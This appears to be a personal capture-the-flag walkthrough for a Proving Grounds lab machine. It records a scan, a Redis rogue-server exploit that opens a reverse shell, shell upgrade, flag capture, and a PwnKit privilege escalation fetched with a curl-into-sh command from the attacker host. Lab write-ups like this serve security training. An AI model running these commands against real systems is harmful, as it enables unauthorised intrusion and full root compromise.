`---------------------Starting Full Scan------------------------`

`PORT     STATE SERVICE`
`22/tcp   open  ssh`
`6379/tcp open  redis`

`Making a script scan on extra ports: 6379`

![[Pasted image 20240208120437.png]]

The first results are either for a not working MSF exploit or a script that needs a file from a git repository that doesn't exist.
Check out the HackTricks page

This has a link to another PoC
![[Pasted image 20240208120605.png]]

`└─$ git clone https://github.com/n0b0dyCN/redis-rogue-server.git`
`Cloning into 'redis-rogue-server'...`
`remote: Enumerating objects: 87, done.`
`remote: Counting objects: 100% (4/4), done.`
`remote: Compressing objects: 100% (4/4), done.`
`remote: Total 87 (delta 0), reused 1 (delta 0), pack-reused 83`
`Receiving objects: 100% (87/87), 245.56 KiB | 3.41 MiB/s, done.`
`Resolving deltas: 100% (19/19), done.`

`┌──(user㉿kalipurple)-[~/Offsec/ProvingGrounds/Blackgate/2]`
`└─$ cd redis-rogue-server/RedisModulesSDK/exp`
                                                                                                          
`┌──(user㉿kalipurple)-[~/…/2/redis-rogue-server/RedisModulesSDK/exp]`
`└─$ make` 

Make sure it created the .so file
`┌──(user㉿kalipurple)-[~/…/2/redis-rogue-server/RedisModulesSDK/exp]`
`└─$ ls -l`
`total 108`
`-rw-r--r-- 1 user user   757 Feb  8 12:06 Makefile`
`-rw-r--r-- 1 user user  2108 Feb  8 12:06 exp.c`
`-rw-r--r-- 1 user user 52344 Feb  8 12:07 exp.o`
`-rwxr-xr-x 1 user user 47904 Feb  8 12:07 exp.so`

`└─$ ./redis-rogue-server.py --rhost 192.168.190.176 --lhost 192.168.45.235`
`______         _ _      ______                         _____`                          
`| ___ \       | (_)     | ___ \                       /  ___|`                         
`| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ --.  ___ _ ____   _____ _ __` 
`|    // _ \/ _ | / __| |    // _ \ / _ | | | |/ _ \  --. \/ _ \ '__\ \ / / _ \ '__|`
`| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |`   
`\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|`   
                                     `__/ |`                                            
                                    `|___/`                                             
`@copyright n0b0dy @ r3kapig`

`[info] TARGET 192.168.190.176:6379`
`[info] SERVER 192.168.45.235:21000`
`[info] Setting master...`
`[info] Setting dbfilename...`
`[info] Loading module...`
`[info] Temerory cleaning up...`
`What do u want, [i]nteractive shell or [r]everse shell: r`
`[info] Open reverse shell...`
`Reverse server address: 192.168.45.235`
`Reverse server port: 4444`
`[info] Reverse shell payload sent.`
`[info] Check at 192.168.45.235:4444`
`[info] Unload module...`

If the above script gives errors, revert the machine.
Catch and upgrade the reverse shell.

`└─$ nc -nlvp 4444`
`Ncat: Version 7.94SVN ( https://nmap.org/ncat )`
`Ncat: Listening on [::]:4444`
`Ncat: Listening on 0.0.0.0:4444`
`Ncat: Connection from 192.168.190.176:60988.`
`whoami`
`prudence`
`python3 -c 'import pty; pty.spawn("/bin/bash")'`
`prudence@blackgate:`

Grab the local flag
`prudence@blackgate:/tmp$ cat ~/local.txt`
`cat ~/local.txt`
`2fe30ddb954cd0952c2e25cccd8fad09`

Run lse_cve.sh to check for CVEs

`[!] cve-2021-4034 Checking for PwnKit vulnerability........................ yes!`

Get this from https://github.com/ly4k/PwnKit

`sh -c "$(curl -fsSL http://192.168.45.235/PwnKit.sh)"`

`prudence@blackgate:/tmp$ sh -c "$(curl -fsSL http://192.168.45.235/PwnKit.sh)"`
`< -c "$(curl -fsSL http://192.168.45.235/PwnKit.sh)"`
`root@blackgate:/tmp# cat /root/proof.txt`
`cat /root/proof.txt`
`7fc5faa7a476ae8c5d9aa3146c2aaf40`
